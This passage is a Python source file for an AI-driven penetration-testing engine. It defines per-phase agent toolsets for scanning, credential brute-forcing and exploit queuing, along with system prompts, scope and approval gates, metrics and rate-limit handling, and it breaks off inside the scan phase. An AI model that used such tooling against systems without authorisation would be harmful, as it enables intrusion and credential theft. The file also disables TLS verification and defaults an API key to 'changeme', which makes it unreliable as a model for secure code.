"""LangGraph pentest engine — the AutoGen → LangGraph migration (Phase 1→4).

Runs a pentest session behind the SAME `/pentest` API. `AGENT_ENGINE`
(`langgraph` default as of Phase 4 | `autogen` fallback) selects the engine, and
a per-request `engine` field overrides it for one session. Design invariants
from Docs/LANGGRAPH_MIGRATION_PLAN.md:

  * Reuses the existing `scan_tools` bodies unchanged — so the scope gate,
    MAX_CONCURRENT_SCANS and webhook contracts are exactly the same. A node that
    dispatches is NOT a new dispatcher; it calls the same gated function.
  * Persists to the SAME `agent_sessions` / `agent_messages` tables via db_utils,
    sets the SAME `scan_tracker` session context (so `/scans`, port_profile and
    web_profile behave identically) and writes the SAME `llm_request_metrics`
    rows (via a LangChain callback instead of AutoGen's monkeypatch).
  * Deterministic supervisor edges (recon → scan → analyze → [exploit] → report)
    — this is what removes the GroupChat speaker-selection stall class.
  * Checkpoints to Postgres (thread_id = session_id) via PostgresSaver, the
    native replacement for manual message persistence + parent_session_id resume.

Phase 3 made **recon** a real LLM agent. Phase 4 adds:
  * **scan** and **analyze** as LLM agents (same pattern, per-phase toolsets),
  * an opt-in **exploit** phase whose approval is a native `interrupt()` —
    the graph parks in Postgres and the operator resumes it via
    `POST /pentest/{id}/approve` (`Command(resume=...)`), which is the durable
    replacement for `/nudge` + UserProxy input,
  * LLM metrics + scan-tracker parity so flipping the default loses nothing.

Nodes execute inline on the calling thread (single-task steps), which is why the
thread-local `scan_tracker` / `LLMMetricsContext` context set in
`run_langgraph_session_sync` is visible inside every node. Keep the graph
sequential: a parallel fan-out would run in worker threads and lose it.
"""
from __future__ import annotations

import functools
import json
import operator
import os
import threading
import time
import uuid
from typing import Annotated, Any, Dict, List, Optional, TypedDict

from langgraph.graph import StateGraph, START, END

import logging

import scan_tools
from db_utils import add_agent_message, get_agent_session, update_agent_session
from scan_tools import scan_tracker

_log = logging.getLogger("langgraph_engine")

ENGINE_NAME = "langgraph"
_MSG_CAP = 4000

# ── per-phase tool surfaces ──────────────────────────────────────────────────
# Every name below must exist in the AutoGen roster; the same bodies are called,
# so nothing here creates a new dispatch path. tests/test_langgraph_phases.py
# pins these sets against langgraph_tools.TOOL_NAMES so a rename fails the build
# instead of silently shrinking a phase's toolset to nothing.

# Read-only queries against data we already hold. No traffic leaves the platform.
_READ_ONLY = {
    "query_assets", "query_open_ports", "query_vulnerabilities",
    "get_web_findings", "search_all_findings", "get_attack_vectors",
    "query_credential_findings", "query_exploitdb", "search_knowledge_base",
    "get_session_scan_status", "get_all_active_jobs",
}

RECON_TOOLS = _READ_ONLY | {"get_passive_recon_plan"}

# Scan planning is read-only; dispatch is added ONLY when auto_execute is on.
SCAN_TOOLS_READONLY = {
    # get_tool_recommendations is the actionable one: structured tools +
    # command templates + the ingested methodology for the service, which is
    # what turns "there is an https port" into "run these specific tests".
    "get_tool_recommendations",
    "get_scan_recommendations", "get_passive_recon_plan", "query_assets",
    "query_open_ports", "get_session_scan_status", "get_all_active_jobs",
    "search_knowledge_base",
}
# Discovery / enumeration dispatchers. Deliberately EXCLUDES the credential
# brute-force tools (start_brutus, start_credential_check) and everything
# exploit-adjacent: those stay behind the human-approved exploit phase, so the
# blast radius of an autonomous scan phase is enumeration only.
SCAN_TOOLS_DISPATCH = {
    "start_nmap_scan", "start_naabu", "start_masscan", "start_deep_port_scan",
    "start_udp_scan", "start_httpx_probe", "start_nuclei_scan", "start_web_scan",
    "start_pipeline_scan", "start_playwright_scan", "start_katana",
    "start_subfinder", "start_dnsx", "start_asnmap", "start_uncover",
    "start_cloudlist", "start_passive_recon", "start_subdomain_takeover",
    "start_smb_vuln_scan", "start_full_scan",
}

# Credential discovery. Kept OUT of SCAN_TOOLS_DISPATCH above and added only for
# an engagement the operator pre-approved — see the scan node.
#
# The comment above says these "stay behind the human-approved exploit phase",
# but EXPLOIT_PLAN_TOOLS never contained them, so in practice no phase could
# reach them at all: a run against a host with ftp, ssh, telnet and vnc open
# produced zero credential_findings. That is not caution, it is a gap — the
# tools existed, the services were found, and nothing ever tried.
SCAN_TOOLS_CREDENTIAL = {"start_credential_check", "start_brutus"}

ANALYZE_TOOLS = _READ_ONLY | {"match_vuln_to_exploits", "search_msf_modules",
                              "get_tool_recommendations"}

# Exploit PLANNING is read-only + the queue-for-approval call, which only writes
# a pending_exploits row. Execution is a separate node, reached only after the
# operator approves through the interrupt.
EXPLOIT_PLAN_TOOLS = {
    "query_vulnerabilities", "query_open_ports", "query_assets",
    "match_vuln_to_exploits", "query_exploitdb", "search_msf_modules",
    "customize_exploit", "list_pending_exploits", "get_exploit_approval_status",
    "queue_exploit_for_approval", "search_knowledge_base",
}

_RECON_SYSTEM = (
    "You are the Reconnaissance agent in a penetration-testing platform. Use ONLY "
    "the read-only tools provided to enumerate what is already known about the "
    "target: discovered assets, open ports, existing vulnerabilities and web "
    "findings. Do NOT attempt to launch scans. When you have gathered enough, "
    "reply with a concise reconnaissance summary (assets, notable ports/services, "
    "and the most important existing findings)."
)
_SCAN_SYSTEM_PLAN = (
    "You are the Scanner agent in a penetration-testing platform. auto_execute is "
    "OFF for this session, so you must NOT launch anything — you have no dispatch "
    "tools. Use the read-only tools to work out what SHOULD be scanned next and "
    "reply with a prioritised, concrete scan plan (tool, target, ports/scope, and "
    "why) that the operator can run manually. For each open service worth "
    "testing, call get_tool_recommendations(service, port) — it returns the "
    "specific tools, command templates, nuclei tags and methodology for that "
    "service, so your plan can name real commands instead of generalities."
)
_SCAN_SYSTEM_DISPATCH = (
    "You are the Scanner agent in a penetration-testing platform. auto_execute is "
    "ON, so you may launch discovery and enumeration scans with the start_* tools. "
    "Before choosing, call get_tool_recommendations(service, port) for the "
    "services you found — it returns the specific tools, command templates and "
    "methodology for each, which is how you pick the right scan rather than a "
    "generic one. "
    "Rules: launch only against the session's target; prefer one or two scans that "
    "add the most information over a broad sweep; never launch the same scan twice; "
    "a tool that answers 'not in the configured scope' is REFUSED — do not retry it "
    "or try a variant of the target, report it. Do not wait for jobs to finish. "
    "Finish by replying with what you dispatched (tool, target, job id) and what "
    "you deliberately did not."
)
_ANALYZE_SYSTEM = (
    "You are the Analyzer agent in a penetration-testing platform. Use the "
    "read-only tools to review the findings held for this target and reply with an "
    "analysis: the highest-value findings by exploitability (not just severity), "
    "which services they sit on, any credible attack chains, and which findings "
    "have known public exploits. Do NOT launch scans or exploits."
)
# Why this asks for EVERY candidate rather than the best one.
#
# It used to say "the single best-evidenced candidate ... EXACTLY ONCE". A host
# with 26 open services — vsftpd, distcc, samba, java-rmi, irc, all of them
# known-vulnerable — produced one queued exploit, and the other twenty-five were
# never evaluated, never queued, never rejected and never reported. They were
# invisible: an operator reading the session could not tell whether the agent had
# considered and dismissed them or simply never looked.
#
# Queueing is not executing. Every row lands `pending` behind the same approval
# gate, so the cost of naming more candidates is a list the operator chooses
# from, and the cost of naming fewer is a foothold nobody was told about.
_EXPLOIT_SYSTEM = (
    "You are the Exploit agent in a penetration-testing platform. Identify EVERY "
    "well-evidenced exploitation candidate for this target from existing findings "
    "— not just the best one — and call queue_exploit_for_approval once for each, "
    "strongest evidence first. A human operator reviews and approves before "
    "anything executes, and you must never execute anything yourself. "
    "Queueing is not executing: it is how a candidate becomes visible to the "
    "operator, so a service you considered and dismissed should be SAID so in "
    "your reply rather than silently dropped. If nothing is well-evidenced enough "
    "to be worth an operator's time, queue nothing and say which services you "
    "looked at and why none qualified. Reply with the candidates, the pending "
    "exploit ids you queued, and your reasoning for each."
)


# ── operator-editable prompts ────────────────────────────────────────────────
# The phase prompts above are DEFAULTS. `agent_config.SYSTEM_MESSAGES` plus the
# active `prompt_configs` row is what the Prompt Config UI edits, and AutoGen's
# PentestTeam overlaid it per key. Reading it here keeps that UI live: without
# this, retiring AutoGen would have turned every saved prompt customisation into
# a store-only setting that silently changed nothing.
#
# Per-key overlay, not replacement, so a config defining only "coordinator"
# leaves the other phases on their defaults.
_PHASE_PROMPT_KEY = {
    "Reconnaissance": "reconnaissance",
    "Scanner": "scanner",
    "Analyzer": "analyzer",
    "Exploit": "exploit",
    "Reporter": "reporter",
}


def _prompt_for(agent_name: str, default: str) -> str:
    """The active operator prompt for a phase, else the engine default.

    Appended to the phase default rather than replacing it: the defaults carry
    the LangGraph-specific contract (which tools exist, that dispatch is
    forbidden in a read-only phase, that the agent must not execute an exploit).
    An operator prompt that replaced them outright could talk an agent out of a
    safety property, which is not something a prompt field should be able to do.
    """
    key = _PHASE_PROMPT_KEY.get(agent_name)
    if not key:
        return default
    try:
        from db_utils import get_active_prompt_config
        active = get_active_prompt_config()
        prompts = (active or {}).get("prompts") or {}
        extra = prompts.get(key)
        if isinstance(extra, str) and extra.strip():
            return (f"{default}\n\n[operator prompt: "
                    f"{(active or {}).get('name') or 'active config'}]\n{extra.strip()}")
    except Exception as e:  # noqa: BLE001
        _log.warning("could not read the active prompt config: %s", e)
    return default


# ── LLM client + metrics parity ──────────────────────────────────────────────
# Agent name -> routing task. The agents are the only LLM consumers whose
# "task" is not obvious from the call site, because one engine runs all of
# them; this is the mapping the operator's per-task model selection keys on.
# An agent absent from here uses the global model, i.e. today's behaviour.
_AGENT_TASK = {
    "Reconnaissance": "recon",
    "Recon": "recon",
    "Analyzer": "analyze",
    "Analysis": "analyze",
    "Exploit": "exploit",
    "Exploitation": "exploit",
    "Scanner": "scan",
    "PostEnumerationation": "postex",
    "PostEx": "postex",
    "Report": "analyze",
}


def task_for_agent(agent_name):
    """The routing task for an agent, or None when it has no dedicated route."""
    if not agent_name:
        return None
    return _AGENT_TASK.get(agent_name) or _AGENT_TASK.get(str(agent_name).strip())


def _model_override_for_task(task):
    """(model, backend) the operator selected for this task, or (None, None).

    Soft import and never raises: a broken resolver must degrade to the global
    model, not take the agent phase down.
    """
    if not task:
        return None, None
    try:
        from common.llm_settings import get_route
        r = get_route(task)
        if r.get("source", "").startswith("route."):
            return r.get("model"), r.get("backend")
    except Exception as e:
        _log.warning("route lookup for task=%r failed: %s", task, e)
    return None, None


def _chat_model(task=None):
    """A LangChain chat model targeting the SAME active backend AutoGen uses
    (get_llm_config resolves dashboard-DB over env: Azure DeepSeek here).

    When `task` has an operator-configured route, its MODEL replaces the global
    one. The backend is deliberately NOT switched here: these agents need
    reliable tool calling and each backend needs its own LangChain client, so
    cross-backend agent routing is a separate change -- a route naming a
    different backend logs and keeps the model only.
    """
    from agent_config import get_llm_config
    cfg = (get_llm_config() or [{}])[0]
    at = (cfg.get("api_type") or "openai").lower()
    model, base_url, api_key = cfg.get("model"), cfg.get("base_url"), cfg.get("api_key")
    routed_model, routed_backend = _model_override_for_task(task)
    if routed_model:
        if routed_backend and routed_backend != at:
            _log.warning(
                "route for task=%s names backend %r but the agent engine is on "
                "%r; using the routed MODEL only", task, routed_backend, at)
        _log.info("task=%s -> model %s (was %s)", task, routed_model, model)
        model = routed_model
    temperature = cfg.get("temperature", 0.1)
    timeout = cfg.get("timeout", 120)
    if at == "azure":
        from langchain_openai import AzureChatOpenAI
        return AzureChatOpenAI(azure_endpoint=base_url, api_key=api_key,
                               api_version=cfg.get("api_version"),
                               azure_deployment=model, temperature=temperature,
                               timeout=timeout, max_retries=1)
    from langchain_openai import ChatOpenAI
    return ChatOpenAI(model=model, base_url=base_url, api_key=api_key,
                      temperature=temperature, timeout=timeout, max_retries=1)


def metrics_callback(session_id: str, agent_name: str):
    """A LangChain callback handler writing the SAME `llm_request_metrics` rows
    AutoGen's `llm_metrics` monkeypatch writes.

    Without this, flipping AGENT_ENGINE to langgraph would silently empty the LLM
    cost/latency dashboards — the metrics table is fed by an AutoGen-specific
    patch on OpenAIWrapper.create that a LangChain client never goes through.
    The row keys must stay identical to `llm_metrics._patched_create`'s.
    """
    from langchain_core.callbacks import BaseCallbackHandler
    from llm_metrics import LLMMetricsContext

    class _Handler(BaseCallbackHandler):
        def __init__(self):
            self._started: Dict[str, float] = {}
            self._model: Dict[str, str] = {}

        # on_chat_model_start fires for chat models; on_llm_start for completions.
        def _start(self, serialized, run_id, invocation_params=None):
            self._started[str(run_id)] = time.time()
            params = invocation_params or {}
            self._model[str(run_id)] = (params.get("model")
                                        or params.get("azure_deployment")
                                        or params.get("model_name") or "unknown")

        def on_chat_model_start(self, serialized, messages, *, run_id=None, **kw):
            self._start(serialized, run_id, kw.get("invocation_params"))

        def on_llm_start(self, serialized, prompts, *, run_id=None, **kw):
            self._start(serialized, run_id, kw.get("invocation_params"))

        def _record(self, run_id, *, usage=None, tool_names=None,
                    is_error=False, error_message=None):
            key = str(run_id)
            started = self._started.pop(key, None)
            model = self._model.pop(key, "unknown")
            latency_ms = round((time.time() - started) * 1000, 2) if started else 0.0
            usage = usage or {}
            names = [n for n in (tool_names or []) if n]
            try:
                LLMMetricsContext.record_request({
                    "session_id": session_id,
                    "agent_name": agent_name,
                    "model_name": model,
                    "prompt_tokens": usage.get("prompt_tokens"),
                    "completion_tokens": usage.get("completion_tokens"),
                    "total_tokens": usage.get("total_tokens"),
                    "latency_ms": latency_ms,
                    "has_tool_calls": bool(names),
                    "tool_call_count": len(names),
                    "tool_names": names or None,
                    "is_error": is_error,
                    "error_message": error_message,
                    "request_params": json.dumps({"model": model, "engine": ENGINE_NAME}),
                })
            except Exception:
                pass

        def on_llm_end(self, response, *, run_id=None, **kw):
            usage, names = {}, []
            try:
                out = getattr(response, "llm_output", None) or {}
                tu = out.get("token_usage") or out.get("usage") or {}
                usage = {
                    "prompt_tokens": tu.get("prompt_tokens") or tu.get("input_tokens"),
                    "completion_tokens": tu.get("completion_tokens") or tu.get("output_tokens"),
                    "total_tokens": tu.get("total_tokens"),
                }
                for gen_list in (getattr(response, "generations", None) or []):
                    for gen in gen_list:
                        msg = getattr(gen, "message", None)
                        # langchain-core 1.x puts usage on the message when the
                        # provider does not populate llm_output.
                        um = getattr(msg, "usage_metadata", None) or {}
                        if um and not usage.get("total_tokens"):
                            usage = {
                                "prompt_tokens": um.get("input_tokens"),
                                "completion_tokens": um.get("output_tokens"),
                                "total_tokens": um.get("total_tokens"),
                            }
                        for tc in (getattr(msg, "tool_calls", None) or []):
                            names.append(tc.get("name") if isinstance(tc, dict) else None)
            except Exception:
                pass
            self._record(run_id, usage=usage, tool_names=names)

        def on_llm_error(self, error, *, run_id=None, **kw):
            self._record(run_id, is_error=True,
                         error_message=f"{type(error).__name__}: {str(error)[:500]}")

    return _Handler()


def _tools_for(names) -> List[Any]:
    """The LangChain-wrapped registry tools whose names are in `names`."""
    import langgraph_tools as lt
    return lt.tools_named(names)


# ── state ────────────────────────────────────────────────────────────────────
class PentestState(TypedDict):
    session_id: str
    target: str
    task: str
    auto_execute: bool
    exploit_phase: bool
    phase: str
    findings: Annotated[List[str], operator.add]
    log: Annotated[List[str], operator.add]
    exploit_candidate: Optional[str]
    exploit_decision: Optional[dict]
    # Surface-test phase (opt-in, independent of exploit_phase).
    surface_test_phase: bool
    surface_synthesize: Optional[bool]
    surface_auto_exploit: Optional[bool]
    surface_target_request: Optional[str]
    surface_target: Optional[str]
    surface_tests: Optional[list]
    surface_safe_results: Optional[list]
    pending_surface_tests: Optional[list]
    surface_decision: Optional[dict]
    # Post-enumeration is a CYCLE, so its progress has to live in the
    # checkpointed state rather than in a local variable: a session that is
    # interrupted at an approval gate and resumed hours later must know how many
    # passes it has made and what each one found.
    #
    # `enumeration_cycles` bounds it. LangGraph enforces a recursion limit, but
    # hitting that raises rather than finishing, and a run that ends in an
    # exception produces no report.
    enumeration_cycles: int
    enumeration_history: Annotated[List[dict], operator.add]
    report: Optional[str]


# ── side effects (same sinks AutoGen writes to) ──────────────────────────────
def _sid(session_id) -> uuid.UUID:
    return session_id if isinstance(session_id, uuid.UUID) else uuid.UUID(str(session_id))


# The session transcript, in the shape session_collector expects
# ({"name", "content"}). Kept alongside the DB writes because
# collect_session_outputs takes the conversation as a list — the AutoGen path
# handed it `groupchat.messages`, and without an equivalent here every LangGraph
# session silently wrote no session directory to disk.
_transcript: List[dict] = []


def _msg(session_id, agent: str, content: str, role: str = "assistant") -> None:
    """Persist a session message (same table + shape the UI reads)."""
    body = (content or "")[:_MSG_CAP]
    _transcript.append({"name": agent, "role": role, "content": body})
    try:
        add_agent_message(_sid(session_id), agent, role, body)
    except Exception:
        pass


def _emit(event_type: str, session_id, data: dict) -> None:
    """Every node action emits a webhook event — visible in the Agent Activity
    timeline, tagged with the engine so AutoGen vs LangGraph runs are comparable."""
    try:
        import httpx
        rag = os.environ.get("RAG_API_URL", "https://rag-api:8000")
        key = os.environ.get("API_KEY", "changeme")
        httpx.post(f"{rag}/webhooks/emit",
                   json={"event_type": event_type, "source": "langgraph-agent",
                         "data": {"session_id": str(session_id), "engine": ENGINE_NAME, **data}},
                   headers={"x-api-key": key}, verify=False, timeout=10)
    except Exception:
        pass


def _tool(fn, *args, **kwargs) -> str:
    """Call a scan_tools body defensively — a tool error becomes a logged line,
    never a crashed graph."""
    try:
        return str(fn(*args, **kwargs))
    except Exception as e:  # noqa: BLE001
        return f"[tool {getattr(fn, '__name__', 'fn')} error: {e}]"


# ── the generic LLM phase ────────────────────────────────────────────────────
# `recursion_limit` counts graph super-steps, and one tool-using turn costs TWO
# (LLM, then ToolNode) — so a budget of 14 is only ~7 tool rounds. The analyze
# phase hit that ceiling on its first live run and returned LangGraph's
# "Sorry, need more steps to process this request." in place of an analysis,
# which reads like a model refusal rather than a budget. Sized per phase from
# observed tool use: analyze made 10 calls.
# One tool-using turn costs TWO super-steps, so a budget of N is ~N/2 tool
# rounds. The originals were too tight — Analyzer (26) and Exploit (22) ran out
# mid-work and returned LangGraph's "Sorry, need more steps" instead of a
# conclusion. Raised so a phase can actually finish, and env-overridable per
# phase (PHASE_STEP_BUDGET_<PHASE>) so an operator can grant more without a code
# change when a rich target needs it.
def _phase_budget(name: str, default: int) -> int:
    try:
        return int(os.environ.get(f"PHASE_STEP_BUDGET_{name.upper()}") or default)
    except (TypeError, ValueError):
        return default


PHASE_STEP_BUDGET = {
    "Reconnaissance": _phase_budget("Reconnaissance", 50),
    "Scanner": _phase_budget("Scanner", 50),          # +dispatch tools, see scan()
    "Analyzer": _phase_budget("Analyzer", 50),
    "Exploit": _phase_budget("Exploit", 50),
}
# LangGraph's own message when the step budget runs out. Surfaced explicitly
# rather than persisted as if it were the agent's answer.
_STEP_LIMIT_MARKER = "need more steps"


# Rate-limit backoff knobs. A 429 is a "come back later", not a failure — waiting
# it out keeps the LLM phase (recon/analyze) alive instead of silently degrading
# to the deterministic summary. Waits are exponential with a ceiling and honour a
# server-supplied Retry-After when present. Tunable via env so an operator can
# match their provider's quota without a code change (defined in .env and the
# autogen-agents service env in docker-compose.yml). `or` guards the empty-string
# trap: a set-but-blank env var must fall through to the default, not parse to 0.
def _env_num(name: str, default: float, cast=float):
    try:
        return cast(os.environ.get(name) or default)
    except (TypeError, ValueError):
        _log.warning("bad %s=%r; using default %s", name,
                       os.environ.get(name), default)
        return cast(default)


_LLM_RATELIMIT_MAX_RETRIES = _env_num("LLM_RATELIMIT_MAX_RETRIES", 4, int)
_LLM_RATELIMIT_BASE_WAIT = _env_num("LLM_RATELIMIT_BASE_WAIT", 5.0)   # sec; 5,10,20,40…
_LLM_RATELIMIT_MAX_WAIT = _env_num("LLM_RATELIMIT_MAX_WAIT", 60.0)
# Self-tuning: watch observed 429s and adapt. On by default; costs nothing when
# the provider is healthy because the pacing interval decays back to zero.
_LLM_RATELIMIT_ADAPTIVE = (os.environ.get("LLM_RATELIMIT_ADAPTIVE") or "true").lower() \
    not in ("0", "false", "no", "off")


class _RateLimitGovernor:
    """Process-wide adaptive throttle (AIMD) shared across concurrent sessions.

    - `pace()` sleeps just enough to honour the current min-interval before a
      call, so a spike of 429s spaces subsequent calls out proactively.
    - `on_rate_limit()` multiplicatively *raises* the interval and remembers the
      server's Retry-After as the effective backoff base — the provider telling
      us its real rate beats any hard-coded guess.
    - `on_success()` additively *lowers* the interval, so once the provider is
      happy the added latency bleeds off and steady-state overhead returns to 0.
    This adapts to the quota actually in force without a redeploy; the static
    env knobs remain the ceiling.
    """

    def __init__(self):
        import threading
        self._lock = threading.Lock()
        self._interval = 0.0           # current min seconds between calls
        self._last_call = 0.0          # monotonic ts of the last paced call
        self._base_wait = _LLM_RATELIMIT_BASE_WAIT  # learned backoff base
        # Bounds derived from the static knobs so self-tuning can never exceed
        # what the operator declared as the ceiling.
        self._interval_cap = _LLM_RATELIMIT_MAX_WAIT
        self._decay = 1.0              # subtract per healthy call
        self._grow = 2.0               # multiply on a 429

    def pace(self):
        if not _LLM_RATELIMIT_ADAPTIVE:
            return
        with self._lock:
            interval = self._interval
            last = self._last_call
        if interval > 0:
            wait = last + interval - time.monotonic()
            if wait > 0:
                time.sleep(min(wait, self._interval_cap))
        with self._lock:
            self._last_call = time.monotonic()

    def on_success(self):
        if not _LLM_RATELIMIT_ADAPTIVE:
            return
        with self._lock:
            if self._interval > 0:
                self._interval = max(0.0, self._interval - self._decay)

    def on_rate_limit(self, server_wait: Optional[float]):
        """Record a 429. Returns the effective wait to use for THIS retry."""
        if not _LLM_RATELIMIT_ADAPTIVE:
            return server_wait
        with self._lock:
            if server_wait and server_wait > 0:
                # Trust the server's stated cool-down as the new backoff base.
                self._base_wait = min(server_wait, self._interval_cap)
            # Grow the proactive spacing (additive floor so the first 429 from a
            # zero interval still moves it off the floor).
            self._interval = min(self._interval_cap,
                                 max(self._base_wait, self._interval * self._grow
                                     if self._interval > 0 else self._base_wait))
            return self._base_wait

    def base_wait(self) -> float:
        with self._lock:
            return self._base_wait

    def snapshot(self) -> dict:
        """Live governor state for the Settings panel.

        The static env knobs are only the ceiling; what an operator actually
        needs to see when agents feel slow is the interval the governor has
        currently backed off to, and the base wait it LEARNED from the
        provider's Retry-After (which overrides the configured one).
        """
        with self._lock:
            return {
                "current_interval_sec": round(self._interval, 2),
                "learned_base_wait_sec": round(self._base_wait, 2),
                "interval_cap_sec": self._interval_cap,
                "throttling": self._interval > 0,
            }


_rl_governor = _RateLimitGovernor()


def get_ratelimit_config() -> dict:
    """Effective 429 knobs + live governor state for THIS process.

    The agents do not go through llm_query — they reach the provider directly
    via langchain — so these knobs are separate from LLM_429_* on purpose, and
    an operator comparing the two needs both reported side by side.
    """
    return {
        "service": "autogen-agents",
        "mechanism": "adaptive governor (AIMD) on the direct langchain path",
        "adaptive": _LLM_RATELIMIT_ADAPTIVE,
        "honours_retry_after": True,
        "env": {
            "LLM_RATELIMIT_MAX_RETRIES": _LLM_RATELIMIT_MAX_RETRIES,
            "LLM_RATELIMIT_BASE_WAIT": _LLM_RATELIMIT_BASE_WAIT,
            "LLM_RATELIMIT_MAX_WAIT": _LLM_RATELIMIT_MAX_WAIT,
            "LLM_RATELIMIT_ADAPTIVE": _LLM_RATELIMIT_ADAPTIVE,
        },
        "live": _rl_governor.snapshot(),
    }


def _is_rate_limit_error(exc: Exception) -> Optional[float]:
    """If `exc` looks like a rate-limit (429), return the seconds to wait
    (server Retry-After if we can read one, else None). Otherwise return -1."""
    # openai/azure raise RateLimitError with .status_code == 429; other stacks
    # bury it in the message. Match on both so we don't depend on one client.
    status = getattr(exc, "status_code", None) or getattr(exc, "code", None)
    text = str(exc).lower()
    looks_ratelimited = (
        status == 429
        or "429" in text
        or "rate limit" in text
        or "ratelimit" in text
        or "too many requests" in text
    )
    if not looks_ratelimited:
        return -1.0
    # Try to read Retry-After from an attached response/headers.
    retry_after = None
    resp = getattr(exc, "response", None)
    hdrs = getattr(resp, "headers", None) if resp is not None else None
    if hdrs:
        try:
            ra = hdrs.get("retry-after") or hdrs.get("Retry-After")
            if ra is not None:
                retry_after = float(ra)
        except (TypeError, ValueError):
            retry_after = None
    return retry_after  # None → caller uses exponential backoff


def _invoke_with_backoff(agent, payload, config, *, session_id=None,
                         agent_name: str = "") -> Any:
    """Call `agent.invoke`, retrying on rate-limit (429) with exponential
    backoff (honouring Retry-After). Re-raises non-rate-limit errors immediately
    and re-raises the last 429 once retries are exhausted so the caller can fall
    back deterministically."""
    attempt = 0
    while True:
        _rl_governor.pace()   # proactive spacing (no-op once the provider is healthy)
        try:
            out = agent.invoke(payload, config)
            _rl_governor.on_success()
            return out
        except Exception as exc:  # noqa: BLE001
            server_wait = _is_rate_limit_error(exc)
            if server_wait == -1.0 or attempt >= _LLM_RATELIMIT_MAX_RETRIES:
                raise
            # Let the governor learn from this 429 and hand back the base wait it
            # now trusts (the server's Retry-After if it gave one).
            learned = _rl_governor.on_rate_limit(server_wait)
            if server_wait is not None:
                wait = server_wait
            else:
                base = learned if learned and learned > 0 else _LLM_RATELIMIT_BASE_WAIT
                wait = min(base * (2 ** attempt), _LLM_RATELIMIT_MAX_WAIT)
            attempt += 1
            _log.warning(
                "%s rate-limited (429); backing off %.0fs before retry %d/%d",
                agent_name or "LLM", wait, attempt, _LLM_RATELIMIT_MAX_RETRIES)
            if session_id is not None:
                try:
                    _msg(session_id, agent_name or "LLM",
                         f"[rate-limited: waiting {wait:.0f}s before retry "
                         f"{attempt}/{_LLM_RATELIMIT_MAX_RETRIES}]")
                except Exception:  # noqa: BLE001
                    pass
            time.sleep(wait)


def _llm_phase(session_id, *, agent_name: str, system: str, tool_names,
               task: str, recursion_limit: int = 20):
    """Run one phase as an LLM agent (LLM ↔ ToolNode) over `tool_names`.

    Returns (final_text, tools_used). Raises on LLM/tool-binding failure so the
    caller can fall back to its deterministic path — a session must never hard-
    fail because a model was rate-limited.
    """
    # create_react_agent moves to langchain.agents.create_agent in langgraph v2;
    # requirements pin langgraph<2 so this stays valid. Swap when we add the
    # langchain meta-package.
    from langgraph.prebuilt import create_react_agent
    tools = _tools_for(tool_names)
    # Per-task model: _llm_phase knows the agent, and the agent decides the
    # task (see _AGENT_TASK). This is the single place every agent phase builds
    # its model, so routing here covers recon/analyze/exploit/scan/postex.
    agent = create_react_agent(_chat_model(task_for_agent(agent_name)), tools,
                               prompt=_prompt_for(agent_name, system))
    out = _invoke_with_backoff(
        agent,
        {"messages": [("user", task)]},
        {"recursion_limit": recursion_limit,
         "callbacks": [metrics_callback(str(session_id), agent_name)]},
        session_id=session_id, agent_name=agent_name,
    )
    msgs = out.get("messages", [])
    tools_used, final = [], ""
    for m in msgs:
        for c in (getattr(m, "tool_calls", None) or []):
            tools_used.append(c.get("name"))
    for m in reversed(msgs):
        if getattr(m, "type", None) == "ai" and (getattr(m, "content", "") or "").strip():
            final = m.content
            break
    if _STEP_LIMIT_MARKER in (final or "").lower():
        final = (f"[TRUNCATED — the {agent_name} agent used its whole step budget "
                 f"({recursion_limit} super-steps, {len(tools_used)} tool calls) "
                 f"before summarising. The tool results above are real; this "
                 f"phase has no written conclusion.]\n{final}")
    return final, [t for t in tools_used if t]


def _phase_result(session_id, agent_name: str, phase: str, next_phase: str,
                  final: str, used: List[str], header: str = "") -> dict:
    distinct = sorted(set(used))
    _msg(session_id, agent_name,
         f"{header}[LLM {phase}] tools used: {', '.join(distinct) or 'none'}\n\n{final[:1800]}")
    _emit("langgraph_phase_completed", session_id,
          {"phase": phase, "mode": "llm", "tools_used": distinct})
    return {"phase": next_phase,
            "findings": [f"{phase}(llm): {len(used)} tool call(s), {len(distinct)} distinct"],
            "log": [f"{phase}(llm): {distinct}"]}


# ── nodes ────────────────────────────────────────────────────────────────────
def recon(state: PentestState) -> dict:
    """LLM recon over read-only tools (Phase 3 cutover)."""
    sid = state["session_id"]
    try:
        task = (f"Target: {state['target'][:300]}\nTask: {state['task'][:300]}\n"
                "Enumerate the known assets, open ports and existing findings, "
                "then summarize.")
        final, used = _llm_phase(sid, agent_name="Reconnaissance",
                                 system=_RECON_SYSTEM, tool_names=RECON_TOOLS,
                                 task=task,
                                 recursion_limit=PHASE_STEP_BUDGET["Reconnaissance"])
        return _phase_result(sid, "Reconnaissance", "recon", "scan", final, used)
    except Exception as e:  # noqa: BLE001
        _emit("langgraph_phase_completed", sid,
              {"phase": "recon", "mode": "fallback", "error": str(e)[:200]})
        return _recon_deterministic(state, note=f"[LLM recon unavailable: {e}] ")


def _recon_deterministic(state: PentestState, note: str = "") -> dict:
    """Read-only recon without an LLM — the fallback so a session never hard-fails."""
    sid = state["session_id"]
    assets = _tool(scan_tools.query_assets, limit=25)
    ports = _tool(scan_tools.query_open_ports, limit=50)
    _msg(sid, "Reconnaissance",
         f"{note}Assets:\n{assets[:1400]}\n\nOpen ports:\n{ports[:1400]}")
    return {"phase": "scan",
            "findings": ["recon(deterministic)"],
            "log": [f"recon deterministic{' — ' + note if note else ''}"]}


def scan(state: PentestState) -> dict:
    """LLM scan phase (Phase 4 cutover).

    The toolset — not the prompt — is what enforces the auto_execute contract:
    with auto_execute off the agent is given NO start_* tool, so it cannot
    dispatch even if it decides to. With it on, every start_* body is the same
    scope-gated, MAX_CONCURRENT_SCANS-bounded function AutoGen calls.
    """
    sid = state["session_id"]
    auto = bool(state.get("auto_execute"))
    names = SCAN_TOOLS_READONLY | (SCAN_TOOLS_DISPATCH if auto else set())

    # Credential tools, only for an engagement the operator pre-approved.
    #
    # SCAN_TOOLS_DISPATCH excludes them because they "stay behind the
    # human-approved exploit phase" — but EXPLOIT_PLAN_TOOLS never contained
    # them either, so no phase of this pipeline could reach them and credential
    # discovery simply never happened. A run against a host with ftp/ssh/telnet/
    # vnc wide open produced zero credential_findings, which reads as "nothing
    # to find" rather than "never looked".
    #
    # Pre-approval is what makes them reachable, for the same reason it skips
    # the exploit interrupt: the operator authorised this engagement in advance.
    # Without it they stay out, exactly as before. Both tools remain scope-gated
    # and MAX_CONCURRENT_SCANS-bounded in their own bodies.
    creds_enabled = False
    _creds_auth = ""
    if auto:
        preapproved, _eid = _engagement_preapproval(sid)
        _rule_name = None
        if not preapproved:
            # A standing approval rule for this target ("approve everything for
